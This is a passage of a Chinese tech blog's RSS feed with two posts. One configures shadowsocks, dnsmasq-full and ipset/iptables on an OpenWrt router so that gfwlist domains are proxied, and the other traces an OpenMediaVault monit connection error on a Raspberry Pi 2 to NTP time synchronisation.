&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">opkg update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">opkg remove dnsmasq
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">opkg install dnsmasq-full
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">opkg install ipset iptables-mod-nat-extra
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget http://x.x.x.x/shadowsocks-libev_2.4.6-1_x86_64.ipk
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">opkg install shadowsocks-libev_2.4.6-1_x86_64.ipk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;em>PS&lt;/em>
在这里，安装官方版的shadowsocks，而不是openwrt spec版, 下载地址在&lt;a class="link" href="https://sourceforge.net/projects/openwrt-dist/files/shadowsocks-libev/" target="_blank" rel="noopener"
>这里&lt;/a>。&lt;/p>
&lt;p>&lt;em>PPS&lt;/em>
在这里，如果安装的顺序不同，可能会导致lib的依赖错误(至少在15.05.1上是这样)。使用&lt;code>ldd&lt;/code>命令，检查一下shadowsocks的依赖包是否正常。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">ldd /usr/bin/ss-redir
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="配置">配置
&lt;/h2>&lt;h3 id="配置shadowsocks">配置shadowsocks
&lt;/h3>&lt;p>配置&lt;code>/etc/shadowsocks.json&lt;/code>，格式如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-json" data-lang="json">&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;server&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;X.X.X.X&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;server_port&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;443&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;local_port&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1080&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;aes-256-cfb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>修改&lt;code>/etc/init.d/shadowsocks&lt;/code>，设置shadowsocks以&lt;code>Proxy Mode&lt;/code>模式启动，同时开启&lt;code>转发DNS请求&lt;/code>功能，上游DNS为&lt;code>8.8.8.8&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/sh /etc/rc.common
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">START&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">95&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SERVICE_USE_PID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SERVICE_WRITE_PID&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">SERVICE_DAEMONIZE&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">CONFIG&lt;/span>&lt;span class="o">=&lt;/span>/etc/shadowsocks.json
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#service_start /usr/bin/ss-local -c $CONFIG -b 0.0.0.0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> service_start /usr/bin/ss-redir -c &lt;span class="nv">$CONFIG&lt;/span> -b 0.0.0.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> service_start /usr/bin/ss-tunnel -c &lt;span class="nv">$CONFIG&lt;/span> -b 0.0.0.0 -l &lt;span class="m">5353&lt;/span> -L 8.8.8.8:53 -u
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">stop&lt;span class="o">()&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#service_stop /usr/bin/ss-local&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> service_stop /usr/bin/ss-redir
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> service_stop /usr/bin/ss-tunnel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>设置shadowsocks开机启动，并手动运行：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">/etc/init.d/shadowsocks &lt;span class="nb">enable&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/etc/init.d/shadowsocks start
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>到目前为止，你已经有了一个监听在1080端口的socks代理，和监听在5353端口的不受污染的DNS服务器&lt;/p>
&lt;h3 id="配置ipset">配置ipset
&lt;/h3>&lt;p>进入Luci界面-网络-防火墙-自定义规则，加入以下规则（最后的&lt;code>1080&lt;/code>是shadowsocks的本地端口，请酌情修改）：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#创建名为gfwlist，格式为iphash的集合&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ipset -N gfwlist iphash
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#匹配gfwlist中ip的nat流量均被转发到shadowsocks端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iptables -t nat -A PREROUTING -p tcp -m &lt;span class="nb">set&lt;/span> --match-set gfwlist dst -j REDIRECT --to-port &lt;span class="m">1080&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#匹配gfwlist中ip的本机流量均被转发到shadowsocks端口&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">iptables -t nat -A OUTPUT -p tcp -m &lt;span class="nb">set&lt;/span> --match-set gfwlist dst -j REDIRECT --to-port &lt;span class="m">1080&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="配置dnsmasq-full">配置dnsmasq-full
&lt;/h3>&lt;p>修改&lt;code>/etc/dnsmasq.conf&lt;/code>，在文末加入&lt;code>conf-dir=/etc/dnsmasq.d&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;conf-dir=/etc/dnsmasq.d&amp;#39;&lt;/span> &amp;gt;&amp;gt; /etc/dnsmasq.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>新建目录&lt;code>/etc/dnsmasq.d&lt;/code>，生成&lt;code>dnsmasq_list.conf&lt;/code> 到该目录：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">git clone https://github.com/cokebar/gfwlist2dnsmasq.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> gfwlist2dnsmasq
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python2 gfwlist2dnsmasq.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mkdir /etc/dnsmasq.d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cp dnsmasq_list.conf /etc/dnsmasq.d
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>其中，&lt;code>dnsmasq_list.conf&lt;/code>的格式为：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-ini" data-lang="ini">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#使用不受污染的DNS解析该域名,可以将此IP改为自己使用的DNS服务器&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">server&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/google.com/127.0.0.1#5353&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#将解析出来的IP保存到名为gfwlist的ipset表中&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="na">ipset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">/google.com/gfwlist&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>你可以手动修改这个文件，你也可以使用&lt;code>gfwlist2dnsmasq.py&lt;/code>自动生成dnsmasq_list版的gfwlist列表。&lt;/p>
&lt;p>重新运行&lt;code>dnsmasq&lt;/code>，它将监听在本机&lt;code>53&lt;/code>端口上。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">/etc/init.d/dnsmasq restart
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="测试">测试
&lt;/h2>&lt;p>场景一&lt;/p>
&lt;ul>
&lt;li>PC端的默认网关设置为&lt;code>192.168.0.1&lt;/code>, DNS设置为&lt;code>192.168.0.1&lt;/code>
&lt;ul>
&lt;li>国内网站访问正常&lt;/li>
&lt;li>Google无法访问&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>场景二&lt;/p>
&lt;ul>
&lt;li>PC端的默认网关设置为&lt;code>192.168.0.254&lt;/code>, DNS设置为&lt;code>192.168.0.254&lt;/code>
&lt;ul>
&lt;li>访问国内网站
&lt;ul>
&lt;li>dnsmasq解析该域名，发现该域名不在dnsmasq_list中，使用默认DNS服务器进行解析，正常访问。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>访问Google
&lt;ul>
&lt;li>dnsmasq解析该域名，发现该域名在dnsmasq_list中，使用设置的安全DNS服务器进行解析，并将该IP加至gfwlist集合中，iptables匹配到规则，将流量转发到shadowsocks监听的端口，进行代理访问。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="参考">参考
&lt;/h2>&lt;ul>
&lt;li>&lt;a class="link" href="https://blog.sorz.org/p/openwrt-outwall/" target="_blank" rel="noopener"
>https://blog.sorz.org/p/openwrt-outwall/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="http://aenes.com/post/740.html" target="_blank" rel="noopener"
>http://aenes.com/post/740.html&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://php-rmcr7.rhcloud.com/openwrt-fq/" target="_blank" rel="noopener"
>https://php-rmcr7.rhcloud.com/openwrt-fq/&lt;/a>&lt;/li>
&lt;li>&lt;a class="link" href="https://cokebar.info/archives/962/comment-page-2/#comments" target="_blank" rel="noopener"
>https://cokebar.info/archives/962/comment-page-2/#comments&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Pi2版OMV的Monit连接错误的问题</title><link>https://www.keepwn.com/posts/error-connecting-to-the-monit-daemon-in-omv-for-pi2/</link><pubDate>Thu, 17 Dec 2015 00:00:00 +0000</pubDate><guid>https://www.keepwn.com/posts/error-connecting-to-the-monit-daemon-in-omv-for-pi2/</guid><description>&lt;h2 id="背景">背景
&lt;/h2>&lt;p>之前买了个树莓派2，闲置了很久，最近正好有NAS需求，就打算拿它装个&lt;code>OpenMediaVault&lt;/code>玩玩。&lt;/p>
&lt;p>安装过程不表。&lt;/p>
&lt;p>事实上是在使用过程中，遇到的某个问题比较奇葩，就拿来分享了。&lt;/p>
&lt;h2 id="林尽水源">林尽水源
&lt;/h2>&lt;p>在网页端对OMV进行配置时，经常会遇到一个弹窗&lt;code>monit: Cannot connect to the monit daemon. Did you start it with http support?&lt;/code>。&lt;/p>
&lt;p>详细错误代码如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">exception&lt;/span> &lt;span class="s1">&amp;#39;OMVException&amp;#39;&lt;/span> &lt;span class="n">with&lt;/span> &lt;span class="n">message&lt;/span> &lt;span class="s1">&amp;#39;Failed to execute command &amp;#39;&lt;/span>&lt;span class="k">export&lt;/span> &lt;span class="n">LANG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">monit&lt;/span> &lt;span class="n">restart&lt;/span> &lt;span class="n">collectd&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">&amp;gt;&amp;amp;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s1">&amp;#39;: monit: Cannot connect to the monit daemon. Did you start it with http support?&amp;#39;&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">share&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">openmediavault&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">monit&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">inc&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">113&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Stack&lt;/span> &lt;span class="n">trace&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#0 /usr/share/php/openmediavault/monit.inc(70): OMVMonit-&amp;gt;action(&amp;#39;restart&amp;#39;, &amp;#39;collectd&amp;#39;, false)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#1 /usr/share/openmediavault/engined/module/collectd.inc(53): OMVMonit-&amp;gt;restart(&amp;#39;collectd&amp;#39;)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#2 /usr/share/openmediavault/engined/rpc/config.inc(206): OMVModuleCollectd-&amp;gt;startService()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#3 [internal function]: OMVRpcServiceConfig-&amp;gt;applyChanges(Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#4 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#5 /usr/share/php/openmediavault/rpcservice.inc(158): OMVRpcServiceAbstract-&amp;gt;callMethod(&amp;#39;applyChanges&amp;#39;, Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#6 /usr/share/openmediavault/engined/rpc/config.inc(224): OMVRpcServiceAbstract-&amp;gt;callMethodBg(&amp;#39;applyChanges&amp;#39;, Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#7 [internal function]: OMVRpcServiceConfig-&amp;gt;applyChangesBg(Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#8 /usr/share/php/openmediavault/rpcservice.inc(125): call_user_func_array(Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#9 /usr/share/php/openmediavault/rpc.inc(79): OMVRpcServiceAbstract-&amp;gt;callMethod(&amp;#39;applyChangesBg&amp;#39;, Array, Array)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#10 /usr/sbin/omv-engined(500): OMVRpc::exec(&amp;#39;Config&amp;#39;, &amp;#39;applyChangesBg&amp;#39;, Array, Array, 1)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#11 {main}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ssh到&lt;code>OMV&lt;/code>终端，输入命令：&lt;code>monit status&lt;/code>，似乎错误信息也一样：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">monit: error connecting to the monit daemon
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在这种情况下，&lt;code>OMV&lt;/code>就无法应用配置，必须解决这问题。&lt;/p>
&lt;!-- more -->
&lt;h2 id="初仿佛若有光">初仿佛若有光
&lt;/h2>&lt;p>于是去google上找啊，找啊，终于找到一篇帖子，遇到了&lt;a class="link" href="http://forums.openmediavault.org/index.php/Thread/8973-Failed-to-execute-command-export-LANG-C-monit-restart-collectd-2-1-monit/" title="Failed to execute command &amp;#39;export LANG=C; monit restart collectd 2&amp;gt;&amp;amp;1&amp;#39;: monit"
target="_blank" rel="noopener"
>相似的问题&lt;/a>（竟然不是StackOverflow，差评！)&lt;/p>
&lt;div class="admonition quote">
&lt;div class="details-summary admonition-title">
&lt;i class='icon fas fa-quote-right fa-fw'>&lt;/i>
Quote
&lt;/div>
&lt;div class="details-content">
&lt;div class="admonition-content">
&lt;p>Because ntpdate is installed in the image. Both ntp server and ntpdate cannot be installed at the same time. Also, the config for the ntp server does not work&amp;hellip;.&lt;/p>
&lt;p>apt-get &amp;ndash;purge remove ntpdate&lt;/p>
&lt;p>Then in the OMV web gui set your timezone because after these changes you cannot set it again.&lt;/p>
&lt;p>then edit /etc/ntp.conf:&lt;/p>
&lt;p>remove these lines:
server 127.127.1.0 # Local clock
fudge 127.127.1.0 stratum 12
server pool.ntp.org iburst&lt;/p>
&lt;p>And replace with these:
server 0.no.pool.ntp.org iburst
server 1.no.pool.ntp.org iburst
server 2.no.pool.ntp.org iburst
server 3.no.pool.ntp.org iburst&lt;/p>
&lt;p>Then you can:
service ntp restart&lt;/p>
&lt;p>Do not disable/enable in the OMV web gui again. The mkconf file for the ntp service will overwrite thesechanges. There need to be some updates so it works properly with the rpi 2.&lt;/p>
&lt;p>Your logs files and dates at boot will be all messed up with wrong dates until you install a RTC module. After boot it takes some minutes before the ntp server will update the time/date. With a RTC module everything is perfect at boot.&lt;/p>
&lt;/div>
&lt;/div>
&lt;/div>
&lt;p>总结几点就是：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Monit&lt;/code>的错误和系统时间有关
&lt;ul>
&lt;li>（检查了一下，确实系统当前时间错误）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>ntpdate&lt;/code>与&lt;code>ntp server&lt;/code>有冲突，不能同时安装
&lt;ul>
&lt;li>（检查了一下，ntp服务启动失败）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;code>OMV&lt;/code>自带的ntp配置&lt;code>/etc/ntp.conf&lt;/code>有错误&lt;/li>
&lt;li>你应该安装&lt;code>RTC&lt;/code>模块&lt;/li>
&lt;/ul>
&lt;h2 id="复行数十步">复行数十步
&lt;/h2>&lt;p>按照前面这位贤者的建议，我分别进行了一下几个测试：&lt;/p>
&lt;ul>
&lt;li>测试一: 手动修改当前时间，卸载&lt;code>ntpdate&lt;/code>，关闭&lt;code>ntp&lt;/code>服务
&lt;ul>
&lt;li>重启以后，时间丢失&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>测试二: 卸载&lt;code>ntpdate&lt;/code>，不修改&lt;code>ntp&lt;/code>配置文件
&lt;ul>
&lt;li>&lt;code>ntp&lt;/code>服务正常启动，时间同步正确&lt;/li>
&lt;li>重启以后，&lt;code>ntp&lt;/code>服务正常启动，时间无法同步&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>测试三: 卸载&lt;code>ntpdate&lt;/code>，修改&lt;code>ntp&lt;/code>配置文件
&lt;ul>
&lt;li>&lt;code>ntp&lt;/code>服务正常启动，时间同步正确&lt;/li>
&lt;li>重启以后，&lt;code>ntp&lt;/code>服务正常启动，时间无法同步&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>测试四: 运行&lt;code>ntpdate&lt;/code>，强制同步
&lt;ul>
&lt;li>时间同步正确&lt;/li>
&lt;li>重启以后，&lt;code>ntp&lt;/code>服务不能正常启动，时间无法同步&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>测试后发现，因为树莓派本身的硬件限制，系统重启后会丢失当前时间。&lt;/p>
&lt;p>尽管开启了&lt;code>ntp&lt;/code>服务，但是如果系统当前时间与真实时间跨度太大，则不会进行同步。&lt;/p>
&lt;p>所以只能放弃&lt;code>ntp server&lt;/code>，转而使用&lt;code>ntpdate&lt;/code>来强制同步时间，并设置开机启动。&lt;/p>
&lt;p>代码如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
